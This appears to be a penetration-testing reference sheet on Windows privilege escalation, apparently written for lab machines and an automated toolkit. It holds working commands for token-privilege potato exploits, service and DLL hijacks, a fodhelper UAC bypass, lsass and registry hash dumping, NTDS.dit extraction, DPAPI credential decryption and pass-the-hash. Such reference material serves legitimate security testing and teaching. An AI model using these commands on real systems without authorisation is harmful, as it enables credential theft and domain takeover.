# Windows privilege escalation

## Manual sweep

```powershell
whoami /all                        # groups AND privileges — read this carefully
systeminfo
net user; net localgroup administrators
Get-LocalUser; Get-LocalGroup
ipconfig /all; netstat -ano
Get-ChildItem C:\Users -Force
Get-Process | Select Name,Path
```

## Token privileges (`whoami /priv`)

The fastest wins on Windows lab boxes:

| Privilege | Exploit |
|-----------|---------|
| SeImpersonatePrivilege | PrintSpoofer / GodPotato / JuicyPotato — instant SYSTEM |
| SeAssignPrimaryToken | same potato family |
| SeBackupPrivilege | read SAM+SYSTEM hives, dump hashes offline |
| SeRestorePrivilege | overwrite a system binary or service DLL |
| SeDebugPrivilege | inject into a SYSTEM process, or dump lsass |
| SeTakeOwnership | take a protected file, then rewrite it |
| SeLoadDriver | load a vulnerable driver |

```powershell
.\PrintSpoofer64.exe -i -c cmd
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

**Which potato, and why one fails:** they all coerce a SYSTEM service to
authenticate to a local listener; they differ in the trigger and OS coverage.

- **PrintSpoofer / GodPotato** — first choice on modern Windows (2019/2022,
  Win10/11). GodPotato works across .NET versions and is the most reliable today.
- **JuicyPotato** — only pre-1809 (Server 2016 / older). Needs a working DCOM
  CLSID for the OS build; picks a BITS/other CLSID.
- **RoguePotato** — 1809+ where JuicyPotato's OXID resolver trick was patched;
  needs an outbound `135` redirector (`-r <redir>`), so a locked-down egress
  kills it.
- **DCOMPotato / EfsPotato / SharpEfsPotato** — fallbacks when the spooler is
  disabled; EfsPotato uses MS-EFSR locally.

If a potato "does nothing", it usually printed the error and you truncated it:
read the full output. `SeImpersonate` absent → potatoes are the wrong tool
entirely; look at the other privileges below, or (on a DC) the local Kerberos
relay in `references/ad.md`.

Less-common but plantable privileges worth knowing:

- **SeManageVolume** → open a handle to the volume, gain write into
  `C:\Windows`, drop a DLL a SYSTEM service loads (e.g. a phantom DLL) → SYSTEM.
- **SeBackup/SeRestore** → `reg save HKLM\SAM/SYSTEM/SECURITY`, or read any file
  (copy `NTDS.dit` on a DC) and dump offline. **On a DC the SAM hive is a dead
  end** — its RID-500 is the local/DSRM admin, which does not authenticate to the
  domain, and the backup right still can't open ACL-protected files with a plain
  read. The payoff is `NTDS.dit`: make a VSS shadow with `diskshadow` (script
  files must be **CRLF** or it silently eats the last char of each line), then
  `robocopy /b` the file out of the snapshot (backup semantics bypass the ACL);
  `secretsdump -ntds -system` offline → every domain hash → PtH. This is exactly
  the Backup Operators → Domain Admin path, so audit that group on DCs.
- **SeDebug** → dump lsass (`rundll32 comsvcs.dll MiniDump`) or inject.

## Service misconfigurations

```powershell
# unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
# weak service permissions
accesschk.exe -uwcqv "Authenticated Users" *
sc qc <service>; sc config <service> binPath= "C:\temp\rev.exe"; sc stop <service>; sc start <service>
```
Also check for writable directories in a service binary's path, and writable
DLLs it loads (DLL hijack). **For a .NET service you can add files next to (but
not overwrite) its `.exe`**, drop an app-local `hostfxr.dll`: the apphost prefers
a co-located `hostfxr.dll` over the shared runtime, so your `DllMain` runs as that
exe's account when the service starts. Works whenever you have write into the
apphost's directory; self-delete the DLL after firing.

## Credentials on disk

**First command after any Windows foothold: list the root of the system drive.**

```powershell
Get-ChildItem "C:/" -Force | Select-Object Mode,Name
```

Anything that is not a stock Windows directory (`Program Files`, `Windows`,
`Users`, `ProgramData`, `PerfLogs`, `$Recycle.Bin`, `Recovery`,
`System Volume Information`) was put there by an administrator, and is where
application logs, installers and backups live. Then hunt logs inside it:

```powershell
Get-ChildItem "C:/AppDir" -Recurse -Force -Include *.log,*.bak,ERRORLOG*,*.txt -ErrorAction SilentlyContinue |
  Select-Object FullName,Length
Select-String -Path "C:/AppDir/Logs/ERRORLOG.BAK" -Pattern "Logon failed|Login failed|password"
```

Auth stacks log the username that was *supplied*, verbatim — so a password
typed into the username field is persisted in cleartext. Read the line *after*
each failed logon for the real account name. Enumeration scripts do not flag
this, because nothing about the file is misconfigured; only the ACL is.


```powershell
Get-ChildItem -Path C:\ -Include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
type C:\Windows\Panther\Unattend.xml
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
Get-ChildItem -Recurse -Force C:\Users\*\AppData\Roaming\Microsoft\Credentials
```
PowerShell history is a reliable hit:
```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## AlwaysInstallElevated

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Both set to 1 → any MSI you write runs as SYSTEM.

## Scheduled tasks

```powershell
schtasks /query /fo LIST /v | findstr /i "taskname task to run run as"
```
A task running as SYSTEM whose script you can write is the same win as a Linux
cron.

## Hash extraction

```powershell
reg save HKLM\SAM sam.hiv; reg save HKLM\SYSTEM sys.hiv     # needs SeBackup or admin
```
```bash
pwnloop x "impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL"
pwnloop x "evil-winrm -i $T -u Administrator -H <nthash>"        # pass-the-hash
```

## Credential stores beyond files

```powershell
cmdkey /list                                    # saved creds → runas /savecred
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
# Web Credentials / Credential Manager (DPAPI-backed)
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ }
```

`runas /savecred /user:admin cmd` uses a stored cred without knowing it. Browser
logins, `.git-credentials`, WSL, and app config in `%APPDATA%`/`%LOCALAPPDATA%`
are all worth a pass. Wi-Fi keys: `netsh wlan show profile <n> key=clear`.

## When LSASS cannot be read

PPL/Credential Guard, EDR, or a plain lack of `SeDebugPrivilege` all end the same
way: no process dump. The registry route needs only backup rights and is quieter:

```
reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM sys.hiv & reg save HKLM\\SECURITY sec.hiv
```
```bash
pwnloop x "impacket-secretsdump -sam sam.hiv -system sys.hiv -security sec.hiv LOCAL"
```

Three distinct payloads come out, and the last two are routinely overlooked:

- **local NT hashes** — lateral movement to other machines sharing an account;
- **cached domain credentials (DCC2/MSCache2)** — of the domain users who have
  logged in here. Not usable for pass-the-hash, crackable only, but they name the
  accounts that matter on this host;
- **LSA secrets** — the cleartext passwords of accounts registered as *services*
  (`_SC_<service>`), plus `DefaultPassword` from autologon. A service account
  password recovered this way is a domain credential in plain text, which is
  usually worth more than everything else in the dump.

## DPAPI

User secrets (browser cookies, saved RDP/creds, some cert keys) are
DPAPI-blobs. With the user's password or their masterkey you decrypt offline:
```bash
pwnloop x "impacket-dpapi masterkey -file <mk> -sid <SID> -password <pw>"
pwnloop x "impacket-dpapi credential -file <blob> -key <decrypted-mk>"
```
As SYSTEM, the `DPAPI_SYSTEM` LSA secret decrypts every machine blob —
`SharpDPAPI`/`mimikatz lsadump::secrets`. This is often the bridge from local
admin to a *domain* credential stashed in a user profile.

**When an NT hash will not crack, look for the cleartext instead.** A machine
triage (`SharpDPAPI machinetriage`, `mimikatz lsadump::secrets`) reaches
credentials stored by scheduled tasks and services — those are held so the system
can *use* them, so they decrypt to plaintext. An account whose hash is
uncrackable is frequently sitting in cleartext one DPAPI blob away.

## LAPS and gMSA

If the box uses LAPS, the local admin password is in AD and readable by whoever
was delegated — check it before hunting a local privesc, it may hand you admin
directly:
```bash
pwnloop x "nxc ldap $T -u <u> -p <p> -M laps"
pwnloop x "nxc ldap $T -u <u> -p <p> --gmsa"          # gMSA managed passwords
```
gMSA `msDS-ManagedPassword` readers can pull the account's NT hash and use it
(often a service account with strong rights).

## UAC bypass (medium → high integrity)

When you're a local admin but in a medium-integrity shell (`whoami /groups`
shows the admin group *Deny-only*), you don't need a CVE — use an auto-elevate
bypass: `fodhelper`, `computerdefaults`, or a `ms-settings`/`.msc` hijack.
```powershell
# fodhelper: point the shell-open command at your payload, then trigger
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c <payload>"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Start-Process fodhelper.exe
```

## Backstop

```
winPEASx64.exe log     # staged in /opt/static
```
Read its "interesting" sections rather than the whole dump; treat it as a
checklist confirmation, not a substitute for `whoami /priv`.

## Domain-joined?

If the host is in a domain, stop treating it as a standalone box and switch to
`references/ad.md` — the escalation is usually a domain path, not a local one.
